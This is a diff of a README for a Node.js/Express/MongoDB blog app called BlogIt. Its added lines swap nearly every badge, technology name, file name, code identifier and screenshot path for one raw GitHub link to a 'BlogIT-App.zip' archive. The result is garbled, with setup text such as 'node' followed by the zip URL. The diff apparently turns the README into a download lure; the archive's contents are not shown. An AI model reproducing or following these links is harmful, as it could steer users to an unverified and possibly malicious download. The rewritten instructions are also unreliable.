@@ -4,11 +4,11 @@
 
 A simple blog platform where users can sign up/sign in, create posts with cover images, and comment on posts.
 
-<a><img src="https://img.shields.io/badge/Node.js-18%2B-brightgreen" /></a>
-<a><img src="https://img.shields.io/badge/Express-5-black" /></a>
-<a><img src="https://img.shields.io/badge/MongoDB-Mongoose-green" /></a>
-<a><img src="https://img.shields.io/badge/View-EJS-blue" /></a>
-<a><img src="https://img.shields.io/badge/UI-Bootstrap%205-7952B3" /></a>
+<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip%2B-brightgreen" /></a>
+<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" /></a>
+<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" /></a>
+<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" /></a>
+<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip%205-7952B3" /></a>
 
 
 </div>
@@ -17,10 +17,10 @@ A simple blog platform where users can sign up/sign in, create posts with cover 
 
 ## Overview
 
-**BlogIt** is a classic, server‑rendered web app built with **Node.js, Express, EJS, MongoDB/Mongoose, Multer, JWT cookies, and Bootstrap**.
+**BlogIt** is a classic, server‑rendered web app built with **https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip, Express, EJS, MongoDB/Mongoose, Multer, JWT cookies, and Bootstrap**.
 
 Key capabilities:
-- User auth with **JWT** stored in **HTTP‑only cookies** (custom middleware attaches `req.user`/`res.locals.user`)
+- User auth with **JWT** stored in **HTTP‑only cookies** (custom middleware attaches `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`/`https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`)
 - Create/read blog posts with **image uploads** (Multer → `public/uploads/`)
 - **Comments** on posts; author avatar + name rendered via **Mongoose `populate`**
 - Clean, responsive UI with Bootstrap layout
@@ -30,7 +30,7 @@ Key capabilities:
 
 ## Tech Stack
 
-- **Backend:** Node.js, Express, Mongoose  
+- **Backend:** https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip, Express, Mongoose  
 - **Views:** EJS, Bootstrap 5  
 - **Auth:** JWT (cookie) + `cookie-parser`  
 - **Uploads:** Multer (disk storage)  
@@ -41,7 +41,7 @@ Key capabilities:
 ## Getting Started
 
 ### Prerequisites
-- Node.js **18+** and npm
+- https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip **18+** and npm
 - MongoDB running locally, or a MongoDB Atlas cluster
 
 ### 1) Clone & install
@@ -60,14 +60,14 @@ JWT_SECRET=replace_with_a_long_random_string
 PORT=8000
 ```
 
-At the **top** of `index.js` (before reading any `process.env`):
+At the **top** of `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip` (before reading any `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`):
 ```js
 require('dotenv').config();
 ```
 
 Sanity check (optional):
 ```js
-console.log('MONGO_URL ->', process.env.MONGO_URL);
+https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip('MONGO_URL ->', https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip);
 ```
 
 ### 3) Create uploads folder
@@ -84,7 +84,7 @@ npm run dev
 # or plain node
 npm start
 # or
-node index.js
+node https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
 ```
 App will start on `http://localhost:8000` (or your `PORT`).
 
@@ -98,16 +98,16 @@ App will start on `http://localhost:8000` (or your `PORT`).
 │  └─ uploads/           # Multer saves images here (served statically)
 ├─ views/                # EJS templates (partials, pages)
 ├─ models/
-│  ├─ blog.js
-│  ├─ comment.js
-│  └─ user.js
+│  ├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
+│  ├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
+│  └─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
 ├─ routes/
-│  ├─ blog.js
-│  └─ user.js
+│  ├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
+│  └─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
 ├─ middlewares/
-│  └─ authentication.js  # checkForAuthenticationCookie('token')
-├─ index.js
-├─ package.json
+│  └─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip  # checkForAuthenticationCookie('token')
+├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
+├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
 └─ .env
 ```
 
@@ -129,7 +129,7 @@ App will start on `http://localhost:8000` (or your `PORT`).
 - `POST /user/signup` — Create account
 - *(optional)* `POST /user/logout` — Clear cookie
 
-> The auth middleware reads the JWT from the **`token`** cookie and sets `req.user` / `res.locals.user`.
+> The auth middleware reads the JWT from the **`token`** cookie and sets `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip` / `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`.
 
 ---
 
@@ -137,13 +137,13 @@ App will start on `http://localhost:8000` (or your `PORT`).
 
 <p align="center">
   <!-- Replace with your own images -->
-  <img src="screenshots/home.png" alt="Home" width="48%">
-  <img src="screenshots/blog.png" alt="Blog Detail" width="48%">
+  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Home" width="48%">
+  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Blog Detail" width="48%">
 </p>
 <p align="center">
-  <img src="screenshots/signin.png" alt="Signin" width="32%">
-  <img src="screenshots/create.png" alt="Create Post" width="32%">
-  <img src="screenshots/comment.png" alt="Comments" width="32%">
+  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Signin" width="32%">
+  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Create Post" width="32%">
+  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Comments" width="32%">
 </p>
 
 
